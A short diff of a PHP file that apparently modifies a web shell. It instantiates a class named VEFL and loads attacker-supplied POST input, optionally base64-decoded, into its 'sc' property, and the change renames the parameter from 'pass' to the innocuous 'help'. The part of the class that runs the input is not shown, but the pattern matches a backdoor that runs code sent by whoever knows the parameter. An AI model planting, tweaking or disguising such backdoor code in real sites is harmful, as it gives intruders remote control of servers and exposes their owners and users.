@@ -16,5 +16,5 @@ class VEFL {
     }
 }
 $vefl = new VEFL();
-@$vefl->sc = isset($_GET['id'])?base64_decode($_POST['pass']):$_POST['pass'];
+@$vefl->sc = isset($_GET['id'])?base64_decode($_POST['help']):$_POST['help'];
 ?>
